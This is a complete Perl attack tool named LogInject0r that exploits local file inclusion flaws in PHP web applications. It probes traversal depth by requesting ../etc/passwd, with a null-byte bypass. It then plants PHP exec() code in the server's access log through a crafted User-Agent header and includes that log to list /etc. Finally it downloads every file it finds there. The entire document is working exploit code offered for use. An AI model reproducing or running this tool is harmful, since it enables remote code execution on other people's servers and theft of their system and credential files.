#!/usr/bin/perl -w
# LogInject0r - Coded by Douglas
# WeakNetLabs@Gmail.com
#
use LWP::UserAgent;
use Term::ANSIColor;
# startup:
my @yearNow = localtime;
print color 'yellow';
print color 'on_blue';
print "\nLogInject0r";
print color 'reset';
print " - Inject PHP into logs to read filesystems.\n" . 
	($yearNow[5] + 1900) . " (c) WeakNetLabs.com\n\n";
# no arguments?
if($ARGV[0]){
	$read = 0; # token for writing contents of log file.
	for($i=0;$i<=$#ARGV;$i++){ # parse arguments
		chomp $ARGV[$i];
		if($ARGV[$i] eq '-u'){
			$url = $ARGV[$i+1];
		}
	}
	if(!$url){ end(); } # said '-u' buh no url? :,-(
}else{
	end();
}
# Stack em up:
@dirs = ("ETC");
$dots = "../";
$depth = 0;
$serverType = "";
$foundLog = 0;
@lighttpd = ("var/log/lighttpd/access_log", "var/log/lighttpd/access.log");
@foundFilesEtc = ();
$domain = $url; $domain =~ s/http:\/\///; $domain =~ s/\/.*//;
print "[ ! ] Scan for host: " . $domain . "\n";
$urlLog = $url;
$urlLog =~ s/=.*/=/; # makes it 'blahblah.php?filename=' etc..
# get depth of hole in server:
print "[ ! ] Checking depth of server's security hole.\n";
while ($depth == 0) {
	$urlLog .= $dots;
        $url_append_file = $urlLog;
	$url = $urlLog; # overwrite this so we have "http://victim.com/file.php?filename=../../../../../../" for later.
        $url_append_file .= 'etc/passwd';
        print "[ ; ] She says to go deeper.\n";
        @file = `curl -A 'Mozilla' $url_append_file 2>/dev/null`; # <-- Make this a legit UA
        if (grep(/failed to open stream/i, @file)) {
                print "[ ; ] Let\'s NULL byte her hole.\n";
                $url_append_file .= '%00';
                @file = `curl -A 'Mozilla' $url_append_file 2>/dev/null`;
                if(!grep(/failed to open stream/i, @file)) {
                	$depth = 1;
			last;
		}
        }elsif(grep(/<title>.*not found.*<\/title>/i, @file)){
		print "[ X ] 404: File not found.\n\n";
                timestamp();
                exit();
        }elsif(grep(/<title>.*404.*<\/title>/i, @file)){
                timestamp();
                print "[ X ] 404: File not found.\n\n";
                exit();
        }elsif(grep(/<title>.*500.*<\/title>/i, @file)) {
                timestamp();
                print "[ X ] Internal Server Error\n\n";
                exit();
        }else{
		$depth = 1;
		last;
        }
}
print "[ ! ] " . $url_append_file . " WORKS!\n";
$ua = LWP::UserAgent->new; # pwning starts hjere:
# SERVER TYPE
my $req = HTTP::Request->new(GET => $url_append_file);
my $res = $ua->request($req);
my @headers = split(/\n/, $res->headers_as_string());
my $n = 0;
foreach(@headers) {
	$serverType = $_ if($_ =~ m/Server/i);
}
if ($serverType eq ''){
	print "[ X ] Cannot determine HTTP server type.\n";
}else{
	$serverType =~ s/[Ss]erver: ?//;
	print "[ ! ] Server type found: " . $serverType . "\n";
}

foreach $directory (@dirs) {
	# Compile a, long ass, UA String:
	$myUa = LWP::UserAgent->new;
	$myUa->agent('<?php echo "###### ' . 
		$directory . 
		' BEGIN\n"; exec("ls -l /' . 
		lc($directory) . 
		'/", $dir); foreach($dir as $line){echo $line . "\n";}echo "###### '. 
		$directory . ' END";?>');
	$ua->agent($myUa);
	my $req = HTTP::Request->new(GET => $url);
	my $res = $myUa->request($req);
	if($res->is_success) { # if up, then inject0r it! :D
		print "[ ! ] Injected code into log file on server!\n"; # pjear!
		# GET THE DIRECTORY LISTING IN the LOG
		printDir($directory); # I subbed this so I can pass other shit to it later when I exapnd this code.
	}else{
	        print "[ X ] Your URL or host seems down!\n";
	       	exit();
	}
}
# GET the directory contents:
sub printDir {
	system("mkdir ../logs/scans/$domain 2>/dev/null");
	# urgh, i hate precompiling things like this:
	$domain2 = $domain;
	$domain2 .= "/LogInject0r_log.txt";
	open(LOG, ">>../logs/scans/$domain2") || die "[ X ] Could not open file for writing that I just made?\n\n";
	foreach(@lighttpd) {
		my $urlLogFile = $url; # preserve our filename=../../../../../ url.
		$urlLogFile .= $_; # append the (new) filename=../../../../../$_ 
		@logLines = `curl $urlLogFile 2>/dev/null`; # wtf does curl barf so much shit into STDERR?
		if(!grep(/o such file or directory/i, @logLines)){
			$foundLog = 1;
			print "[ ! ] Found the " . $serverType . " log file.\n";
			print "[ ! ] " . $urlLogFile . "\n";
			last;
		}else{
		}
	}
	if($foundLog == 1) {
		$start = "###### " . $_[0] . " BEGIN";
		$end = "###### " . $_[0] . " END";
		foreach(@logLines) { 
			if($read == 1) { 
				print LOG $_;
				# split it up and put it into an array
				# to loop through and grab each file:
				if($_ !~ m/^d/i && $_ !~ m/^#/ && $_ =~ m/^-/) { # Not a directory (maybe depth later?)
					push(@foundFilesEtc, $_);
				}
			}
			if($_ =~ m/$start/i) {
				$read = 1;
			}
			if($_ =~ m/$end/i){
				$read = 0;
			}
		}
	}else{
		print "[ X ] Sorry, I couldn't find the log file.\n[ X ] Attack failed\n\n";
	}
}

print "[ ! ] Attempting to snag all files found in /etc\n";
foreach(@foundFilesEtc) {
	my @file = split(/ /, $_);
	my $file = $file[-1];
	# Make HTTP request for file:
	my $urlFile = $url .  "/etc/" . $file;
        my $req = HTTP::Request->new(GET => $urlFile);
        my $res = $myUa->request($req);
        if($res->is_success) { # if up, then inject0r it! :D
		$openfile = "../logs/scans/" . $domain . "/" . $file;
		open(LOGFILE, ">$openfile") || die "Cannot open file for writing the directory I just made?\n[ X ] " .
			$openfile . "\n\n";
		print LOGFILE $res->content;
		close LOGFILE;
        }
}

sub end {
	print "Usage: ./LogInject0r -u <URL>\n\n";
	exit();
}
print "\n";
# The End :)
